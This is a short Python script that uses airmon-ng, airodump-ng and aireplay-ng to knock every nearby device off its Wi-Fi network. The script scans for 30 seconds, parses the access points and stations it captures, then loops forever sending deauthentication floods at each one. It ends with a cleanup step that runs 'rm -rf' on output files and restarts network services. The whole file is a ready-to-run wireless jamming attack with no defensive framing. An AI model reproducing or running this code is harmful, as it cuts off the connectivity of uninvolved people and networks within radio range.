from os import popen as send
from time import sleep
import os
import subprocess
import signal
import csv
import sys

#this program stops all wireless conections to routers nearby
#it does this by sending deauth attacks to every nearby device

try:
	interface = sys.argv[1]
except:
	print('no interface specified')

try:
	#airmon-ng start wlan1
	send("airmon-ng start "+interface).read()
	
	#airodump-ng wlan1mon
	proc=subprocess.Popen(['airodump-ng','-w output', interface+'mon'])
	sleep(30)
	
	os.kill(proc.pid, signal.SIGINT)
	sleep(1)
	
	BSSIDS=[]
	CH=''
	STATIONS=[]
	k=0
	
	with open(' output-01.csv', mode='r') as file:
		csvfile = csv.reader(file)
		for obj in csvfile:
			try:
				if k>5 and obj!=[]:
					STATIONS.append(obj[0])
					BSSIDS.append(obj[5])
				k=k+1
			except:
				pass
				
	
	while(True):
		for i in range(len(BSSIDS)):
			send('aireplay-ng -0 10 -a '+BSSIDS[i]+' -c '+ STATIONS[i]+ ' '+interface+'mon')
		
	
except:
	#delete output files
	send("rm -rf *output*")
	
	#reset wifi adaptor
	send("airmon-ng stop "+interface+'mon').read()
	send("systemctl restart net*").read()


